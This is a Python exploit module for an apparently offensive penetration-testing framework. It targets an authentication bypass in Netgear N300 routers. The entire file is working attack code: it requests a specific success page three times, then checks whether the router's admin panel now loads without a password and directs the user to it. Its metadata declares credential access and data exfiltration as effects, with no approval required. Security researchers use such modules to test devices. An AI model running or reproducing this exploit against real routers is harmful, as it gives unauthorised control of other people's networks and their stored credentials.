#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Netgear N300 Auth Bypass"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Netgear N300 Auth Bypass',
        'description': 'Module exploits authentication bypass vulnerability in Netgear N300 devices. It is possible to access administration panel without providing password.',
        'author': ['Daniel Haake', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.compass-security.com/fileadmin/Datein/Research/Advisories/CSNC-2015-007_Netgear_WNR1000v4_AuthBypass.txt', 'http://www.shellshocklabs.com/2015/09/part-1en-hacking-netgear-jwnr2010v5.html'],
        'tags': ['iot', 'router', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            url = "{}:{}".format(self.target, self.port)
            print_info("Visit: {}/\n".format(url))
        else:
            print_error("Target seems to be not vulnerable")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/",
        )
        if response is None:
            return False  # target is not vulnerable

        # unauthorized
        if response.status_code == 401:
            for _ in range(0, 3):
                response = self.http_request(
                    method="GET",
                    path="/BRS_netgear_success.html",
                )
                if response is None:
                    return False  # target is not vulnerable

            response = self.http_request(
                method="GET",
                path="/"
            )
            if response is None:
                return False  # target is not vulnerable

            # authorized
            if response.status_code == 200:
                return True  # target is vulnerable

        return False  # target not vulnerable
